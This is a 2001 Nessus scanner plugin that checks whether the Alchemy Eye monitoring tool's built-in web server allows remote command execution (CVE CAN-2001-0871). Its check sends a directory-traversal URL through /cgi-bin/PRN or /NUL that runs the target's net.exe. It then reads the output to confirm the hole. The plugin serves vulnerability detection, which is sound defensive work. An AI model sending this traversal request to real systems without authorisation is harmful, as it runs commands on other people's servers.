#
# This script was written by Drew Hintz ( http://guh.nu )
# 
# It is based on scripts written by Renaud Deraison and  HD Moore
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10818);
 script_version("$Revision: 1.9 $");
 script_bugtraq_id(3599);
 script_cve_id("CAN-2001-0871");
 name["english"] = "Alchemy Eye HTTP Command Execution";
 script_name(english:name["english"]);
 
 desc["english"] = string("
Alchemy Eye and Alchemy Network Monitor are network management
tools for Microsoft Windows. The product contains a built-in HTTP
server for remote monitoring and control. This HTTP server allows
arbitrary commands to be run on the server by a remote attacker. 
(Taken from the security announcement by http://www.rapid7.com.)

Solution : Either disable HTTP access in Alchemy Eye, or require
authentication for Alchemy Eye. Both of these can be set in the
Alchemy Eye preferences.

More Information : http://www.securityfocus.com/archive/1/243404

Risk factor : High");

 script_description(english:desc["english"]);
 
 summary["english"] = "Determines if arbitrary commands can be executed by Alchemy Eye";
 
 script_summary(english:summary["english"]);
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2001 H D Moore & Drew Hintz ( http://guh.nu )");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_keys("www/alchemy");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;
if(!get_port_state(port))exit(0);

function check(req)
{
 soc = http_open_socket(port);
 if(soc)
 {
 req = http_get(item:req, port:port);
 send(socket:soc, data:req);
 r = http_recv(socket:soc);

 http_close_socket(soc);
 pat = "ACCOUNTS | COMPUTER"; 

 if(pat >< r) {
   	security_hole(port:port);
	return(1);
 	}
 }
 return(0);
}

dir[0] = "/PRN";
dir[1] = "/NUL";
dir[2] = "";

for(d=0;dir[d];d=d+1)
{
	url = string("/cgi-bin", dir[d], "/../../../../../../../../WINNT/system32/net.exe");
	if(check(req:url))exit(0);
}



